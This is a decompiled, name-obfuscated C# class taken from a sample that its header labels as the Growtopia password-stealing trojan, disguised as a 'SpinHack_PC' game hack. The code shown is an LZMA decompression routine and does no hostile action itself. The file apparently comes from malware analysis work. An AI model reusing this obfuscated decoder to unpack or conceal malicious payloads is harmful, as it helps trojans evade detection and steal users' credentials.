// Decompiled with JetBrains decompiler
// Type: 03EA31CF
// Assembly: SpinHack_PC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65E7A0C4-9AD9-4435-B85F-DA409F1EDFB9
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-PSW.MSIL.Growtopia.gen-6e6f85f9f7933c4446076b2de915fc2fbc76ca58137fe993addedeabb4392347.exe

using System;
using System.IO;

public class \u00303EA31CF
{
  private uint \u0036DD32482 = 1;
  private readonly \u0033423527A \u00371327C99 = new \u0033423527A();
  private readonly \u003103B5DFB \u0037AEC7F8F = new \u003103B5DFB();
  private readonly \u0032F756FA0[] \u0030F41720A = new \u0032F756FA0[192];
  private readonly \u0032F756FA0[] \u00314010F54 = new \u0032F756FA0[12];
  private readonly \u0032F756FA0[] \u00379206A1F = new \u0032F756FA0[12];
  private readonly \u0032F756FA0[] \u00306ED3053 = new \u0032F756FA0[12];
  private readonly \u0032F756FA0[] \u003071C5282 = new \u0032F756FA0[12];
  private readonly \u0032F756FA0[] \u00366FF53AD = new \u0032F756FA0[192];
  private readonly \u0032FBF2B8B[] \u00324A16C80 = new \u0032FBF2B8B[4];
  private readonly \u0032F756FA0[] \u00325A04537 = new \u0032F756FA0[114];
  private \u0032FBF2B8B \u0034DFD63BD = new \u0032FBF2B8B(4);
  private readonly \u00303EA31CF.\u00365512DC9 \u0031E3617CF = new \u00303EA31CF.\u00365512DC9();
  private readonly \u00303EA31CF.\u00365512DC9 \u0031B663D26 = new \u00303EA31CF.\u00365512DC9();
  private readonly \u00303EA31CF.\u003794F4A84 \u00319482BF1 = new \u00303EA31CF.\u003794F4A84();
  private uint \u0037D3F3228;
  private uint \u0030AE20485;
  private uint \u0030D974C1F;

  public \u00303EA31CF()
  {
    this.\u0037D3F3228 = uint.MaxValue;
    for (int index = 0; index < 4; ++index)
      this.\u00324A16C80[index] = new \u0032FBF2B8B(6);
  }

  private void \u0032CF92720(uint _param1)
  {
    if ((int) this.\u0037D3F3228 == (int) _param1)
      return;
    this.\u0037D3F3228 = _param1;
    this.\u0030AE20485 = Math.Max(this.\u0037D3F3228, 1U);
    this.\u00371327C99.\u0033B701CC9(Math.Max(this.\u0030AE20485, 4096U));
  }

  private void \u00347290740(int _param1, int _param2)
  {
    if (_param1 > 8)
      throw new ArgumentException("lp > 8");
    if (_param2 > 8)
      throw new ArgumentException("lc > 8");
    this.\u00319482BF1.\u0033CA21D44(_param1, _param2);
  }

  private void \u00343534341(int _param1)
  {
    if (_param1 > 4)
      throw new ArgumentException("pb > Base.KNumPosStatesBitsMax");
    uint num = (uint) (1 << _param1);
    this.\u0031E3617CF.\u00308D812F9(num);
    this.\u0031B663D26.\u00308D812F9(num);
    this.\u0030D974C1F = num - 1U;
  }

  private void \u0036B746D95(Stream _param1, Stream _param2)
  {
    this.\u0037AEC7F8F.\u0031AF35412(_param1);
    this.\u00371327C99.\u0032B7E10D2(_param2, false);
    for (uint index1 = 0; index1 < 12U; ++index1)
    {
      for (uint index2 = 0; index2 <= this.\u0030D974C1F; ++index2)
      {
        uint index3 = (index1 << 4) + index2;
        this.\u0030F41720A[(int) index3].\u00367EE77C6();
        this.\u00366FF53AD[(int) index3].\u00367EE77C6();
      }
      this.\u00314010F54[(int) index1].\u00367EE77C6();
      this.\u00379206A1F[(int) index1].\u00367EE77C6();
      this.\u00306ED3053[(int) index1].\u00367EE77C6();
      this.\u003071C5282[(int) index1].\u00367EE77C6();
    }
    this.\u00319482BF1.\u0035DDE1E42();
    for (uint index = 0; index < 4U; ++index)
      this.\u00324A16C80[(int) index].\u00376CC1848();
    for (uint index = 0; index < 114U; ++index)
      this.\u00325A04537[(int) index].\u00367EE77C6();
    this.\u0031E3617CF.\u003389F79BE();
    this.\u0031B663D26.\u003389F79BE();
    this.\u0034DFD63BD.\u00376CC1848();
  }

  public void \u0035EF52BBA(Stream _param1, Stream _param2, long _param3)
  {
    this.\u0036B746D95(_param1, _param2);
    \u0033551451D.\u0034C16785E obj = new \u0033551451D.\u0034C16785E();
    obj.\u0036B6D673A();
    uint num1 = 0;
    uint num2 = 0;
    uint num3 = 0;
    uint num4 = 0;
    ulong num5 = 0;
    ulong num6 = (ulong) _param3;
    if (num5 < num6)
    {
      if (this.\u0030F41720A[(int) obj.\u00307F51F7A << 4].\u003346576C2(this.\u0037AEC7F8F) != 0U)
        throw new InvalidDataException("IsMatchDecoders");
      obj.\u0037ED73926();
      this.\u00371327C99.\u003553F3A64(this.\u00319482BF1.\u0030BC61C19(this.\u0037AEC7F8F, 0U, (byte) 0));
      ++num5;
    }
    while (num5 < num6)
    {
      uint num7 = (uint) num5 & this.\u0030D974C1F;
      if (this.\u0030F41720A[((int) obj.\u00307F51F7A << 4) + (int) num7].\u003346576C2(this.\u0037AEC7F8F) == 0U)
      {
        byte num8 = this.\u00371327C99.\u00372BC378E(0U);
        this.\u00371327C99.\u003553F3A64(obj.\u003784F61BC() ? this.\u00319482BF1.\u0030BC61C19(this.\u0037AEC7F8F, (uint) num5, num8) : this.\u00319482BF1.\u00339772C86(this.\u0037AEC7F8F, (uint) num5, num8, this.\u00371327C99.\u00372BC378E(num1)));
        obj.\u0037ED73926();
        ++num5;
      }
      else
      {
        uint num9;
        if (this.\u00314010F54[(int) obj.\u00307F51F7A].\u003346576C2(this.\u0037AEC7F8F) == 1U)
        {
          if (this.\u00379206A1F[(int) obj.\u00307F51F7A].\u003346576C2(this.\u0037AEC7F8F) == 0U)
          {
            if (this.\u00366FF53AD[((int) obj.\u00307F51F7A << 4) + (int) num7].\u003346576C2(this.\u0037AEC7F8F) == 0U)
            {
              obj.\u0033233683C();
              this.\u00371327C99.\u003553F3A64(this.\u00371327C99.\u00372BC378E(num1));
              ++num5;
              continue;
            }
          }
          else
          {
            uint num10;
            if (this.\u00306ED3053[(int) obj.\u00307F51F7A].\u003346576C2(this.\u0037AEC7F8F) == 0U)
            {
              num10 = num2;
            }
            else
            {
              if (this.\u003071C5282[(int) obj.\u00307F51F7A].\u003346576C2(this.\u0037AEC7F8F) == 0U)
              {
                num10 = num3;
              }
              else
              {
                num10 = num4;
                num4 = num3;
              }
              num3 = num2;
            }
            num2 = num1;
            num1 = num10;
          }
          num9 = this.\u0031B663D26.\u003659B040A(this.\u0037AEC7F8F, num7) + 2U;
          obj.\u00376960B93();
        }
        else
        {
          num4 = num3;
          num3 = num2;
          num2 = num1;
          num9 = 2U + this.\u0031E3617CF.\u003659B040A(this.\u0037AEC7F8F, num7);
          obj.\u00360321CD2();
          uint num11 = this.\u00324A16C80[(int) \u0033551451D.\u00355A37A03(num9)].\u0032C8A3E50(this.\u0037AEC7F8F);
          if (num11 >= 4U)
          {
            int num12 = (int) (num11 >> 1) - 1;
            uint num13 = (uint) ((2 | (int) num11 & 1) << num12);
            num1 = num11 >= 14U ? num13 + (this.\u0037AEC7F8F.\u003504D6A9D(num12 - 4) << 4) + this.\u0034DFD63BD.\u003334953B0(this.\u0037AEC7F8F) : num13 + \u0032FBF2B8B.\u00339F32073(this.\u00325A04537, (uint) ((int) num13 - (int) num11 - 1), this.\u0037AEC7F8F, num12);
          }
          else
            num1 = num11;
        }
        if ((ulong) num1 >= (ulong) this.\u00371327C99.\u0037A3600CA + num5 || num1 >= this.\u0030AE20485)
        {
          if (num1 != uint.MaxValue)
            throw new InvalidDataException("rep0");
          break;
        }
        this.\u00371327C99.\u00342877347(num1, num9);
        num5 += (ulong) num9;
      }
    }
    this.\u00371327C99.\u003082F154F();
    this.\u00371327C99.\u0036F6B1F13();
    this.\u0037AEC7F8F.\u00370953B9A();
  }

  public void \u0030A316A28(byte[] _param1)
  {
    if (_param1.Length < 5)
      throw new ArgumentException("properties.Length < 5");
    int num1 = (int) _param1[0] % 9;
    int num2 = (int) _param1[0] / 9;
    int num3 = num2 % 5;
    int num4 = num2 / 5;
    if (num4 > 4)
      throw new ArgumentException("pb > Base.kNumPosStatesBitsMax");
    uint num5 = 0;
    for (int index = 0; index < 4; ++index)
      num5 += (uint) _param1[1 + index] << index * 8;
    this.\u0032CF92720(num5);
    this.\u00347290740(num3, num1);
    this.\u00343534341(num4);
  }

  private class \u00365512DC9
  {
    private \u0032F756FA0 \u0031C77110C;
    private \u0032F756FA0 \u0033C4A7ACA;
    private readonly \u0032FBF2B8B[] \u0032D10019F = new \u0032FBF2B8B[16];
    private readonly \u0032FBF2B8B[] \u00363C27817 = new \u0032FBF2B8B[16];
    private \u0032FBF2B8B \u0033C5017AF = new \u0032FBF2B8B(8);
    private uint \u0034A626D06;

    public void \u00308D812F9(uint _param1)
    {
      for (uint index = this.\u0034A626D06; index < _param1; ++index)
      {
        this.\u0032D10019F[(int) index] = new \u0032FBF2B8B(3);
        this.\u00363C27817[(int) index] = new \u0032FBF2B8B(3);
      }
      this.\u0034A626D06 = _param1;
    }

    public void \u003389F79BE()
    {
      this.\u0031C77110C.\u00367EE77C6();
      for (uint index = 0; index < this.\u0034A626D06; ++index)
      {
        this.\u0032D10019F[(int) index].\u00376CC1848();
        this.\u00363C27817[(int) index].\u00376CC1848();
      }
      this.\u0033C4A7ACA.\u00367EE77C6();
      this.\u0033C5017AF.\u00376CC1848();
    }

    public uint \u003659B040A(\u003103B5DFB _param1, uint _param2)
    {
      if (this.\u0031C77110C.\u003346576C2(_param1) == 0U)
        return this.\u0032D10019F[(int) _param2].\u0032C8A3E50(_param1);
      uint num = 8;
      return this.\u0033C4A7ACA.\u003346576C2(_param1) != 0U ? num + 8U + this.\u0033C5017AF.\u0032C8A3E50(_param1) : num + this.\u00363C27817[(int) _param2].\u0032C8A3E50(_param1);
    }
  }

  private class \u003794F4A84
  {
    private uint \u00312D4426E = 1;
    private \u00303EA31CF.\u003794F4A84.\u003628B174E[] \u003191D064B;
    private int \u00346032044;
    private int \u00377B3677F;
    private uint \u0037BC0023C;

    public void \u0033CA21D44(int _param1, int _param2)
    {
      if (this.\u003191D064B != null && this.\u00346032044 == _param2 && this.\u00377B3677F == _param1)
        return;
      this.\u00377B3677F = _param1;
      this.\u0037BC0023C = (uint) ((1 << _param1) - 1);
      this.\u00346032044 = _param2;
      uint length = (uint) (1 << this.\u00346032044 + this.\u00377B3677F);
      this.\u003191D064B = new \u00303EA31CF.\u003794F4A84.\u003628B174E[(int) length];
      for (uint index = 0; index < length; ++index)
        this.\u003191D064B[(int) index].\u0031D1506BE();
    }

    public void \u0035DDE1E42()
    {
      uint num = (uint) (1 << this.\u00346032044 + this.\u00377B3677F);
      for (uint index = 0; index < num; ++index)
        this.\u003191D064B[(int) index].\u00363342231();
    }

    private uint \u003196A6A26(uint _param1, byte _param2) => (uint) ((((int) _param1 & (int) this.\u0037BC0023C) << this.\u00346032044) + ((int) _param2 >> 8 - this.\u00346032044));

    public byte \u0030BC61C19(\u003103B5DFB _param1, uint _param2, byte _param3) => this.\u003191D064B[(int) this.\u003196A6A26(_param2, _param3)].\u003460C5E30(_param1);

    public byte \u00339772C86(\u003103B5DFB _param1, uint _param2, byte _param3, byte _param4) => this.\u003191D064B[(int) this.\u003196A6A26(_param2, _param3)].\u00358167B1F(_param1, _param4);

    private struct \u003628B174E
    {
      private \u0032F756FA0[] \u003501151B6;

      public void \u0031D1506BE() => this.\u003501151B6 = new \u0032F756FA0[768];

      public void \u00363342231()
      {
        for (int index = 0; index < 768; ++index)
          this.\u003501151B6[index].\u00367EE77C6();
      }

      public byte \u003460C5E30(\u003103B5DFB _param1)
      {
        uint index = 1;
        do
        {
          index = index << 1 | this.\u003501151B6[(int) index].\u003346576C2(_param1);
        }
        while (index < 256U);
        return (byte) index;
      }

      public byte \u00358167B1F(\u003103B5DFB _param1, byte _param2)
      {
        uint index = 1;
        do
        {
          uint num1 = (uint) ((int) _param2 >> 7 & 1);
          _param2 <<= 1;
          uint num2 = this.\u003501151B6[(1 + (int) num1 << 8) + (int) index].\u003346576C2(_param1);
          index = index << 1 | num2;
          if ((int) num1 != (int) num2)
          {
            while (index < 256U)
              index = index << 1 | this.\u003501151B6[(int) index].\u003346576C2(_param1);
            break;
          }
        }
        while (index < 256U);
        return (byte) index;
      }
    }
  }
}
